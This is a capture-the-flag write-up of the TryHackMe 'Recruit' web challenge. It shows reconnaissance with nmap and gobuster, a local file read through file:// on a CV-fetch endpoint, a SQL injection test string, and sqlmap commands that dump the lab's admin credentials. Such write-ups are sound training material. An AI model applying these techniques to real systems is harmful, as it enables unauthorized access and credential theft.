- Link: https://tryhackme.com/room/recruitwebchallenge

## Description
**Recruit** has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foothold, escalate your access, and ultimately log in as the **administrator?**

## Reconnaissance
### nmap port scan
```
# Nmap 7.992 scan initiated Sun Oct 25 19:52:02 2026 as: nmap -sV -o portscan.txt 10.66.154.64
Nmap scan report for 10.66.154.64
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 25 19:52:42 2026 -- 1 IP address (1 host up) scanned in 39.82 seconds
```

## directory enumeration
```
# gobuster dir -u "http://10.66.154.64" -t 25 -w ~/Documents/directory-list-2.3-medium.txt -o gobusteroutput.txt -x .php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.154.64
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /home/jimi/Documents/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 1417]
header.php           (Status: 200) [Size: 457]
mail                 (Status: 301) [Size: 311] [--> http://10.66.154.64/mail/]
assets               (Status: 301) [Size: 313] [--> http://10.66.154.64/assets/]
footer.php           (Status: 200) [Size: 289]
file.php             (Status: 200) [Size: 20]
api.php              (Status: 200) [Size: 4151]
javascript           (Status: 301) [Size: 317] [--> http://10.66.154.64/javascript/]
logout.php           (Status: 302) [Size: 0] [--> index.php]
config.php           (Status: 200) [Size: 0]
dashboard.php        (Status: 302) [Size: 457] [--> index.php]
phpmyadmin           (Status: 301) [Size: 317] [--> http://10.66.154.64/phpmyadmin/]
Progress: 22390 / 441124 (5.08%)^C
```

## Website
Some info about the site's tech stacks:

![](../Image%20Trunk/Pasted%20image%2020261025200522.png)
### About the API
- Used for internally fetch and process candidate CVs from external sources:
	- **Might be useful for RCE**
- Appending `/file.php?cv=<URL>` to fetch candidate CV:
	- **Potential / SSRF Vectors!!**
- Support fetching CVs from external URLs such as HTTP and HTTPS:
	- **Should test for a SSRF**
- Request targetting restricted locations may be blocked by the API:
	- **Should try `x/../restricted` trick to traverse the restricted locations**


## Gaining Foothold
### Exploiting API
Fetching a file from my hosted http server, `http://10.66.154.64/file.php?cv=http://192.168.130.147/mycv.html` resulted in response "Only local files are allowed". Which already contradicts the statement "The API supports fetching CVs from external URLs such as HTTP and HTTPS." from `/api.php`.

There is an interesting path `/mail` that, when visited, turns out to be a directory listing.

![](../Image%20Trunk/Pasted%20image%2020261025204036.png)

mail.log content:

```
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------

May 14 09:32:14 recruit-server postfix/qmgr[1789]: 4F1A2203F: removed
```

Looking into `config.php` to look for HR's credentials resulted in response 200 with empty body. This also confirmed the gobuster's `Size: 0` for that path. This could mean that the path might execute something on the server's side and does not show any output on the client side.

However, we can try using the `/file.php` endpoint again to try fetch this content, since the previous response was `Only local files are allowed`.

Trying `http://localhost/config.php`, `http://127.0.0.1/config.php`, and `http://0.0.0.0/config.php` all resulted in `Only local files are allowed` response. Which is weird.

However, it turns out we can use `file://` to actually fetch the server's files. Trying out `file:///etc/hostname` resulted in Access denied:

![](../Image%20Trunk/Pasted%20image%2020261025214118.png)

This is a good progress. Now we know that we can use `file://` to grab server's local files. Since we also already knew the website is using apache, we know that the website's root directory is most likely in `/var/www/html/`. Let's try using that path:

![](../Image%20Trunk/Pasted%20image%2020261025214410.png)

Well would you look at that! we got the hr's password as well as some other server's configuration info.

Logging in as `hr` redirect us to `/dashboard.php`:

![](../Image%20Trunk/Pasted%20image%2020261025214557.png)

## Getting Administrator's Credentials
We know from the `mail.log` that the `Administrator` credential is stored within the backend database. And by looking at the `/dashboard.php` page, It is likely that the search feature is fetching the results from that database. Therefore, we should be trying some kind of SQL Injections.

Trying `Alice% or 1=1--` as the input resulted in SQL error as follows:

![](../Image%20Trunk/Pasted%20image%2020261025221505.png)

For this, I will be using `sqlmap` tool to find vulnerabilities and hopefully dump the table that hold admin's password.

Getting the databases:

```shell-session
# sqlmap -u 'http://10.66.154.64/dashboard.php?search=Alice' --cookie="PHPSESSID=iep2dv86hel1lucb6m83qm7r66" --dbs

...

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:12:40 /2026-10-25/

...

[22:12:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[22:12:06] [INFO] fetching database names
[22:12:06] [WARNING] reflective value(s) found and filtering out
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys

```

Getting tables of `recruit_db`:

```shell-session
# sqlmap -u 'http://10.66.154.64/dashboard.php?search=Alice' --cookie="PHPSESSID=iep2dv86hel1lucb6m83qm7r66" -D recruit_db --tables

...

[22:12:40] [INFO] fetching tables for database: 'recruit_db'
[22:12:41] [WARNING] reflective value(s) found and filtering out
Database: recruit_db
[2 tables]
+------------+
| candidates |
| users      |
+------------+

...
```

And finally, dumping the `users` contents:

```shell-session
# sqlmap -u 'http://10.66.154.64/dashboard.php?search=Alice' --cookie="PHPSESSID=iep2dv86hel1lucb6m83qm7r66" -D recruit_db -T users --dump

...

[22:13:01] [INFO] fetching entries for table 'users' in database 'recruit_db'
Database: recruit_db
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | admin@001admin | admin    |
+----+----------------+----------+

...
```

Found it! All that's left to do is to use it to log in:

![](../Image%20Trunk/Pasted%20image%2020261025222539.png)

Aaaaand, we're in!